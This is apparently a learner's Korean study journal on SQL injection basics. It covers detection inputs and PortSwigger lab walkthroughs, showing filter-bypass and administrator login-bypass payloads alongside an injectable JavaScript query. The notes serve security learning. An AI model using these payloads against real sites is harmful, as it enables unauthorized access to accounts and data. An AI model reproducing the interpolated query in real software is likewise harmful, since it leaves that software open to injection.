# TIL Day 1 — SQL Injection 기초

> 날짜: 2026-03-27
> 학습 시간: Day 1

---

## 오늘 한 것

- [ ] What is SQL Injection 개념 학습
- [ ] Detecting SQL Injection 학습
- [ ] PortSwigger 랩 1번 풀기 (숨겨진 데이터 조회)
- [ ] PortSwigger 랩 2번 풀기 (로그인 우회)
- [ ] 01_OWASP_Top10.md A03 섹션 복습

---

## 핵심 개념 정리

### SQL Injection이란?
사용자 입력값이 SQL 쿼리에 그대로 삽입되어, 공격자가 쿼리 논리를 조작할 수 있는 취약점.

### 공격자가 할 수 있는 것
- 다른 사용자 데이터 조회
- 로그인 우회
- 데이터 변조/삭제
- 서버 장악

---

## 탐지 방법

| 방법 | 입력값 | 판단 기준 |
|------|--------|-----------|
| 따옴표 테스트 | `'` | 에러 발생 시 취약 가능성 |
| 참/거짓 비교 | `OR 1=1` vs `OR 1=2` | 응답이 다르면 취약 |
| 주석 처리 | `'--` | 결과가 달라지면 취약 |
| 시간 지연 | `'; SELECT SLEEP(5)--` | 응답이 5초 늦으면 취약 |

---

## 오늘 푼 랩

### 랩 1 — WHERE절 숨겨진 데이터 조회
**목표**: 미출시 상품까지 전부 출력하기

**공격 페이로드**:
```
/filter?category=Gifts'+OR+1=1--
```

**원리**:
```sql
-- 원래 쿼리
SELECT * FROM products WHERE category = 'Gifts' AND released = 1

-- 공격 후 쿼리
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
-- OR 1=1 → 항상 참 / -- 이후 주석처리 → released 조건 무력화
```

---

### 랩 2 — 로그인 우회
**목표**: administrator 계정으로 비밀번호 없이 로그인

**공격 페이로드**:
```
username: administrator'--
password: (아무거나)
```

**원리**:
```sql
-- 원래 쿼리
SELECT * FROM users WHERE username = 'administrator' AND password = '입력값'

-- 공격 후 쿼리
SELECT * FROM users WHERE username = 'administrator'--' AND password = '입력값'
-- -- 이후 주석처리 → 비밀번호 검증 자체가 사라짐
```

---

## 오늘 깨달은 것

- `--` 는 SQL 주석 기호 → 뒤에 오는 조건을 전부 무력화할 수 있음
- `OR 1=1` 은 항상 참 → WHERE 조건을 무력화할 수 있음
- 입력값을 Prepared Statement 없이 쿼리에 직접 넣으면 무조건 위험
- 랩 풀기 전에 **문제 설명을 먼저 읽어야** 목표를 알 수 있음

---

## 논문 연구와 연결

LLM 생성 코드에서 아래 패턴이 발견되면 오늘 배운 취약점과 직결:
```javascript
// 이런 코드가 있으면 → 랩 1, 2번에서 한 공격이 그대로 통함
db.query(`SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`)
```

---

## 다음 학습 (Day 2)
- Authentication vulnerabilities 개념
- File Upload vulnerabilities 개념
- PortSwigger 랩 각 1개씩
